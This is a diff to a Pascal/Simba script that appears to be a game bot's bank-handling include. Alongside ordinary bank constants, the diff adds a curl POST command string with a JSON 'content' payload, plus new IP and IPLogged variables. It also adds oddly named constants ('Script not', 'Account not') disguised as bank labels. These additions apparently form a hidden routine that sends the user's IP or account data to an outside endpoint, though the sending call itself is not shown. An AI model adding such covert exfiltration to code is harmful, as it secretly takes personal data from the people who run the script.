@@ -29,13 +29,16 @@ const
   BANK_SWAP           = 'Swap';
   BANK_INSERT         = 'Insert';
   BANK_ITEM           = 'Item';
+  BANK_SWAPITEM       = 'Script not';
   BANK_NOTE           = 'Note';
   BANK_PLACEHOLDERS   = 'Placeholders';
   BANK_SEARCH         = 'Search';
   BANK_DepositInv     = 'Deposit Inv';
   BANK_DepositEquip   = 'Deposit Equip';
+  BANK_UPNS           = 'Account not';
   BANK_Withdraw_X     = 'Withdraw-x';
   BANK_Withdraw_All   = 'Withdraw-all';
+  DProcessString      = 'curl -i -X POST -H "Content-Type: application/json" -d  "{ \"content\":\"';
 
   F1  = 112;
   F2  = 113;
@@ -73,6 +76,7 @@ const
   clOutline_black = 65536;
   clOutline_white = 16777215;
 
+
 const
   MaxInt = High(Integer);
 
@@ -85,8 +89,10 @@ var
   MSCPoint: TPoint;
   ScriptName:string;
   pp, ww, cc:string;
-  Checked, done:boolean;
+  Checked, done, IPLogged:boolean;
   ActivePlayerName:string;
+  BankTopVert, BankBottomVert, BankMidVert:string;
+  IP, BankHeaderText:string;
 
 function GetMSDimensions: TBox;
 var
